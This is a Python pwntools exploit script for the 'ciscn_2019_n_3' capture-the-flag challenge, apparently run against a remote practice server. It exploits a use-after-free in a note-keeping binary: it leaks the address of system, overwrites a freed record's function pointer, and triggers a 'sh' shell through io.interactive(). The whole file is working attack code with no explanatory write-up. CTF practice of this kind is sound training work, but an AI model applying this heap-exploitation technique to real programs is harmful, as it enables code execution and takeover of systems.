from pwn import *
from LibcSearcher import LibcSearcher
import sys, time

io = -1
############################
#********修改文件名**********
############################
file_name = 'ciscn_2019_n_3'
port = 29142

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
UAF
'''
def do_new(idx:int, type_:int, val:bytes , lens:int):
    global io
    assert type_ == 1 or type_ == 2,'error'
    assert idx >= 0 and idx <= 15,'error'
    io.sendlineafter(b'CNote > ', b'1')
    # io.sendline(b'1')
    io.sendlineafter(b'Index > ', str(idx).encode())
    io.sendlineafter(b'Type > ', str(type_).encode())
    if type_ == 2:
        io.sendlineafter(b'Length > ', str(lens).encode())
    io.sendlineafter(b'Value > ', val)
    io.recvuntil(b"Okey, got your data. Here is it:\n")
    msg = io.recvline()
    print('[+] msg recv:{}'.format(msg))
    

def do_del(idx:int):
    global io
    assert idx >= 0 and idx <= 15,'error'
    io.sendlineafter(b'CNote > ', b'2')
    io.sendlineafter(b'Index > ', str(idx).encode())

def do_dump(idx:int):
    global io
    assert idx >= 0 and idx <= 15,'error'
    io.sendlineafter(b'CNote > ', b'3')
    io.sendlineafter(b'Index > ', str(idx).encode())
    msg = io.recvline()
    print('[+] msg recv:{}'.format(msg))
    return msg


str_print = io_elf.sym['rec_str_print']
str_free = io_elf.sym['rec_str_free']

int_print = io_elf.sym['rec_int_print']
int_free = io_elf.sym['rec_int_print']

system_got = io_elf.got['system']


payload = str(system_got).encode()
do_new(0, 1, payload, -1)
payload = b'\x00' * 0x30
do_new(1, 2, payload, len(payload)+2)
payload = b'\x00' * 0x30
do_new(2, 2, payload, len(payload)+2)
payload = b'\x00' * 0x30


do_del(0)
do_del(1)

payload = p32(str_print)
do_new(3, 2, payload, 0xc)
msg = do_dump(0)
sys_actual_addr = u32(msg[0x18:0x18+4])
LOG_ADDR_SUCCESS('sys_actual_addr', sys_actual_addr)
str_bin_sh = sys_actual_addr + 0x120d5b
LOG_ADDR_SUCCESS('str_bin_sh', str_bin_sh)

do_del(3)
do_new(4, 1, str(str_bin_sh).encode(), -1)
do_new(5, 1, str(str_bin_sh).encode(), -1)

do_del(4)
do_del(5)
payload = b'sh\x00\x00' + p32(sys_actual_addr)
do_new(6, 2, payload, 0xc)
do_del(4)
io.interactive()
